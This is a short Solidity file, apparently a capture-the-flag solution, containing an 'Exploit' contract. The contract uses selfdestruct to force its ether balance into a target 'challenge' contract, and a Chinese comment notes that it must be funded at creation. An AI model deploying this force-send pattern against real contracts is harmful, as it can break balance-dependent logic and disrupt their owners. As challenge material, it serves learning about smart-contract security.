// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Exploit {
    constructor() public payable {}  // 初始要接收 value 来创建合约
    function exp(address payable challenge ) public {
       selfdestruct(challenge);
    }
}
